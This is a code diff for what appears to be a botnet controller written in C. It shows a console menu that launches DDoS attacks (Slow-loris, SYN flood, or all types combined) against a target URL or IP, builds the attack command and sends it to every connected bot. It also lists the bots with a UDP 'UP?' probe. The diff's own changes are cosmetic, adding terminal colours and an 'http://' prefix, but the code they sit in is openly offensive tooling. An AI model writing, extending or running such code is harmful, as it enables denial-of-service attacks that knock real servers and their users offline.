@@ -14,10 +14,10 @@ void start()
 {
 	char reply[5];
 	const char main_options[] = 
-	"Options:\n"
+	"\033[0;34mOptions:\n"
 	"\t[1] DDos\n"
 	"\t[2] List All the Bots\n"
-	"Choose a # from the list: ";
+	"Choose a # from the list: \033[0m";
 
 	while(1){
 		printf("%s", main_options);
@@ -122,10 +122,10 @@ void ddos()
 		memset(to_send, '\x00', 64);
 
 		if(strncmp(reply, "1", 1) == 0){
-			printf("[*] Selected DDos -> Slow-loris\n");
+			printf("\033[1;36m[*] Selected DDos -> Slow-loris\n");
 			strncpy(type, "SLOW-LORIS", 11);
 
-			printf("\nTarget to DDos[URL form]: ");
+			printf("\nTarget to DDos[URL form]: http://");
 			fgets(target_ip, 30, stdin);
 			target_ip[strlen(target_ip)-1] = '\x00';
 
@@ -133,9 +133,9 @@ void ddos()
 			fgets(max_threads, 4, stdin);
 			max_threads[strlen(max_threads)-1] = '\x00';
 
-			printf("\n[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\n");
+			printf("\n\033[1;32m[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\033[0m\n");
 			
-			sprintf(to_send, "%s %s %s", type, target_ip, max_threads);
+			sprintf(to_send, "%s http://%s %s", type, target_ip, max_threads);
 			printf("Current Options:\n\t%s\n", to_send);
 			send_to_bots(to_send);
 			send_to_bots(to_send);
@@ -145,7 +145,7 @@ void ddos()
 			}
 
 		}else if(strncmp(reply, "2", 1) == 0){
-			printf("[*] Selected DDos -> Syn-Flood\n");
+			printf("\033[1;36m[*] Selected DDos -> Syn-Flood\n");
 			strncpy(type, "SYN-FLOOD", 12);
 
 			printf("\nTarget to DDos[IP form]: ");
@@ -160,7 +160,7 @@ void ddos()
 			fgets(max_threads, 4, stdin);
 			max_threads[strlen(max_threads)-1] = '\x00';
 
-			printf("\n[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\n");
+			printf("\n\033[1;32m[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\033[0m\n");
 			
 			sprintf(to_send, "%s %s %s %s", type, target_ip, max_threads, port);
 			printf("%s\n", to_send);
@@ -175,10 +175,10 @@ void ddos()
 			char SL_port[6];
 			char all_to_send[80];
 
-			printf("[*] Selected DDos -> All available Types\n");
+			printf("\033[1;36m[*] Selected DDos -> All available Types\n");
 			strncpy(type, "*", 2);
 
-			printf("\nTarget to DDos[URL form]: ");
+			printf("\nTarget to DDos[URL form]: http://");
 			fgets(target_url, 30, stdin);
 			target_url[strlen(target_url)-1] = '\x00';
 			
@@ -200,9 +200,9 @@ void ddos()
 			fgets(max_threads, 4, stdin);
 			max_threads[strlen(max_threads)-1] = '\x00';
 
-			printf("\n[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\n");
+			printf("\n\033[1;32m[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\033[0m\n");
 			
-			sprintf(all_to_send, "%s %s %s %s %s", type, target_ip, target_url, port, max_threads);
+			sprintf(all_to_send, "%s %s http://%s %s %s", type, target_ip, target_url, port, max_threads);
 			printf("%s\n", all_to_send);
 			send_to_bots(all_to_send);
 			send_to_bots(all_to_send);
@@ -231,6 +231,7 @@ void ls_all_bots()
 	printf("\n");
 
 	while(connects != NULL){
+
 		if(sendto(connects->sock, "UP?", 3, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr)) == -1) {
 			connects = connects->next;
 			continue;
